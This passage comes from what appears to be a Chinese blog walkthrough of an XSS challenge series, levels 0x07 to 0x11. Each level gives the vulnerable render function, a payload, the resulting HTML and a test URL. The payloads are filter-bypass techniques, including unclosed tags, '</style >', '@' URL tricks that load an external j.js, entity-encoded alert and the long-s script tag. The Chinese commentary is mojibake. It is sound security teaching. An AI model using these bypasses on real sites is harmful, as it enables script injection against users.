class="hljs-string">#</span> <span class="hljs-attr">onerror</span></span><br><span class="hljs-tag">=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=type%3D%22image%22%20src%3D%23%20onerror%0A%3Dalert(1)<br></code></pre></td></tr></table></figure><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><ul><li>server æºç </li></ul><p>è¿‡æ»¤ &lt;/?[^&gt;]+&gt; ï¼Œå¯¹&lt;&gt;æ‹¬èµ·æ¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤æ›¿æ¢æˆç©º,ä½†æ˜¯ç”±äºHTMLçš„å®¹é”™æ€§æé«˜,æ‰€ä»¥,å¯¹äºä¸é—­åˆä¹Ÿèƒ½æ¥å—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">stripTagsRe</span> = /&lt;\/?[^&gt;]+&gt;/gi<br><br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(stripTagsRe, <span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> `&lt;article&gt;$&#123;input&#125;&lt;/article&gt;`<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span></span><br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">article</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span> &lt;/<span class="hljs-attr">article</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3Cimg%20src%3D%23%20onerror%3Dalert(1)%20<br></code></pre></td></tr></table></figure><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><ul><li>server æºç </li></ul><p>è¿‡æ»¤ </style> æ ‡ç­¾ï¼Œ</style > åŠ ç©ºæ ¼å³å¯ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">src</span>) </span>&#123;<br>  src = src.<span class="hljs-title function_ invoke__">replace</span>(/&lt;\/style&gt;/ig, <span class="hljs-string">&#x27;/* \u574F\u4EBA */&#x27;</span>)<br>  <span class="hljs-keyword">return</span> `<br>    &lt;style&gt;<br>      $&#123;src&#125;<br>    &lt;/style&gt;<br>  `<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;/style &gt; <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-xml"></span><br><span class="language-xml">      &lt;/style &gt; <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3C%2Fstyle%20%3E%20%3Cscript%3Ealert(1)%3C%2Fscript%3E<br></code></pre></td></tr></table></figure><h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><ul><li>server æºç </li></ul><p>è¿‡æ»¤äº†ä¸æ˜¯ä»¥<a href="https://www.sogmentfault.comå¼€å¤´çš„å­—ç¬¦ä¸²,ä»¥https//www.sogmentfault.com%E5%BC%80%E5%A4%B4%EF%BC%8C%E9%97%AD%E5%90%88%E6%A0%87%E7%AD%BE%E5%8D%B3%E5%8F%AF">https://www.sogmentfault.comå¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œä»¥https://www.sogmentfault.comå¼€å¤´ï¼Œé—­åˆæ ‡ç­¾å³å¯</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  let domainRe = /^https?:\/\/www\.segmentfault\.com/<br>  <span class="hljs-keyword">if</span> (domainRe.<span class="hljs-title function_ invoke__">test</span>(input)) &#123;<br>    <span class="hljs-keyword">return</span> `&lt;script src=<span class="hljs-string">&quot;$&#123;input&#125;&quot;</span>&gt;&lt;/script&gt;`<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid URL&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">https://www.segmentfault.com&quot;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1) </span></span><br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://www.segmentfault.com&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1) &quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=https%3A%2F%2Fwww.segmentfault.com%22%3E%3C%2Fscript%3E%20%3Cimg%20src%3D%23%20onerror%3D%22alert(1)%20<br></code></pre></td></tr></table></figure><h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><ul><li>server æºç </li></ul><p>å°† &amp; â€˜ â€œ &lt; &gt; &#x2F; ç¬¦å·è½¬ä¸ºå®ä½“ç¼–ç ï¼Œåœ¨URLä¸­ä¼šè§£æ@åé¢çš„ç½‘å€ï¼Œå¦‚æœæ²¡å¼¹å‡ºæ¥è¯•è¯•æ¢ä¸ªæµè§ˆå™¨ï¼Œä½ç‰ˆæœ¬ç«ç‹å¯ä»¥å¼¹å‡º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHtml</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> s.<span class="hljs-title function_ invoke__">replace</span>(/&amp;/g, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&#x27;/g, &#x27;</span>&amp;#<span class="hljs-number">39</span>;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&quot;/g, &#x27;</span>&amp;quot;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&lt;/g, &#x27;</span>&amp;lt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&gt;/g, &#x27;</span>&amp;gt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\//g, &#x27;</span>&amp;#x2f<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">  const domainRe = /^https?:\/\/www\.segmentfault\.com/</span><br><span class="hljs-string">  if (domainRe.test(input)) &#123;</span><br><span class="hljs-string">    return `&lt;script src=&quot;$&#123;escapeHtml(input)&#125;&quot;&gt;&lt;/script&gt;`</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  return &#x27;</span>Invalid URL<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">[<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>](https://www.segmentfault.com@xss.haozi.me/j.js)<br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https:&amp;#x2f&amp;#x2fwww.segmentfault.com@xss.haozi.me&amp;#x2fj.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=https%3A%2F%2Fwww.segmentfault.com%40xss.haozi.me%2Fj.js<br></code></pre></td></tr></table></figure><h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><ul><li>server æºç </li></ul><p>è¾“å…¥å†…å®¹å¤§å†™ï¼ŒHTMLå¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œä½†æ˜¯JavaScriptå¯¹å¤§å°å†™æ•æ„Ÿï¼Œåˆ™ALERT()æ— æ³•æ‰§è¡Œï¼Œéœ€è¦æƒ³åŠæ³•ç»•è¿‡å¯¹JavaScriptçš„çš„å¤§å†™è½¬æ¢ï¼š</p><ol><li>htmlç¼–ç ç»•è¿‡</li><li>å¤–éƒ¨jsæ–‡ä»¶ç»•è¿‡</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">toUpperCase</span>()<br>  <span class="hljs-keyword">return</span> `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">X</span> <span class="hljs-attr">ONERROR</span>=<span class="hljs-string">&amp;#X61;&amp;#X6C;&amp;#X65;&amp;#X72;&amp;#X74;(1)</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3Cimg%20src%3Dx%20onerror%3D%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B(1)%3E%0A<br></code></pre></td></tr></table></figure><h2 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h2><ul><li>server æºç </li></ul><p>ä¸Šé¢˜åŸºç¡€å¢åŠ  script è¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/script/ig, <span class="hljs-string">&#x27;&#x27;</span>)<br>  input = input.<span class="hljs-title function_ invoke__">toUpperCase</span>()<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">X</span> <span class="hljs-attr">ONERROR</span>=<span class="hljs-string">&amp;#X61;&amp;#X6C;&amp;#X65;&amp;#X72;&amp;#X74;(1)</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3Cimg%20src%3Dx%20onerror%3D%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B(1)%3E%20%0A<br></code></pre></td></tr></table></figure><h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h2><ul><li>server æºç </li></ul><p>è¾“å…¥å†…å®¹å¸¦å…¥åˆ°äº†æ³¨é‡Šä¸­ï¼Œå¯ä»¥ç”¨æ¢è¡Œé€ƒé€¸ã€‚ç”±äºè¿‡æ»¤äº†å•å¼•å·â€™ï¼Œæ‰€ä»¥åé¢çš„â€™)å¯ä»¥ç”¨â€“&gt;æ³¨é‡Šæ‰ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/[&lt;/<span class="hljs-string">&quot;&#x27;]/g, &#x27;&#x27;)</span><br><span class="hljs-string">  return `</span><br><span class="hljs-string">    &lt;script&gt;</span><br><span class="hljs-string">          // alert(&#x27;$&#123;input&#125;&#x27;)</span><br><span class="hljs-string">    &lt;/script&gt;</span><br><span class="hljs-string">  `</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;) <br>alert(1)<br>--&gt;<br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br>          // alert(&#x27;) <br>alert(1)<br>--&gt;&#x27;)<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=&#x27;)%20%0Aalert(1)%0A--%3E<br></code></pre></td></tr></table></figure><h2 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h2><ul><li>server æºç </li></ul><p>æ ‡ç­¾é‡Œçš„ç¬¬ä¸€ä¸ªå­—æ¯å‰åŠ ä¸Šä¸‹åˆ’çº¿_ï¼Œå¹¶ä¸”å¤§å†™è¾“å…¥æ‰€æœ‰å­—æ¯ï¼ŒÅ¿æ˜¯å¤è‹±è¯­ä¸­çš„sçš„å†™æ³•, è½¬æˆå¤§å†™æ˜¯æ­£å¸¸çš„S</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/&lt;([a-zA-Z])/g, <span class="hljs-string">&#x27;&lt;_$1&#x27;</span>)<br>  input = input.<span class="hljs-title function_ invoke__">toUpperCase</span>()<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;Å¿cript <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://xss.haozi.me/j.js&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">&quot;HTTPS://XSS.HAOZI.ME/J.JS&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3C%C5%BFcript%20src%3D%22https%3A%2F%2Fxss.haozi.me%2Fj.js%22%20%3E%3C%2Fscript%3E<br></code></pre></td></tr></table></figure><h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h2><ul><li><p>server æºç </p></li><li><p>é—­åˆç»•è¿‡</p></li><li><p>æ³¨é‡Šåé¢å†…å®¹</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHtml</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> s.<span class="hljs-title function_ invoke__">replace</span>(/&amp;/g, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&#x27;/g, &#x27;</span>&amp;#<span class="hljs-number">39</span>;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&quot;/g, &#x27;</span>&amp;quot;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&lt;/g, &#x27;</span>&amp;lt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&gt;/g, &#x27;</span>&amp;gt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\//g, &#x27;</span>&amp;#x2f;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  return `&lt;img src onerror=&quot;console.error(&#x27;</span>$&#123;<span class="hljs-title function_ invoke__">escapeHtml</span>(input)&#125;<span class="hljs-string">&#x27;)&quot;&gt;`</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;);alert(&#x27;1<br>&#x27;);alert(1)//<br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;console.error(&#x27;<span class="hljs-symbol">&amp;#39;</span>);alert(<span class="hljs-symbol">&amp;#39;</span>1&#x27;)&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;console.error(&#x27;<span class="hljs-symbol">&amp;#39;</span>);alert(1)<span class="hljs-symbol">&amp;#x2f;</span><span class="hljs-symbol">&amp;#x2f;</span>&#x27;)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=&#x27;)%3Balert(&#x27;1<br>http://xss.test/?input=&#x27;)%3Balert(1)%2F%2F<br></code></pre></td></tr></table></figure><h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><ul><li><p>server æºç </p></li><li><p>é—­åˆæ ‡ç­¾</p></li><li><p>å †å æ³¨å…¥</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> `<br>&lt;script&gt;<br>  window.data = $&#123;input&#125;<br>&lt;/script&gt;<br>  `<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>``<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<br>1;alert(1);<br><br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-variable language_">window</span>.<span class="hljs-property">data</span> = </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>`<br>`<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-variable language_">window</span>.<span class="hljs-property">data</span> = <span class="hljs-number">1</span>;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3C%2Fscript%3E%60%0A%60%3Cscript%3Ealert(1)<br><br>http://xss.test/?input=1%3Balert(1)%3B<br></code></pre></td></tr></table></figure><h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><ul><li>server æºç </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// from alf.nu</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">s</span>) </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeJs</span> (<span class="hljs-params">s</span>) </span>&#123;<br>    <span 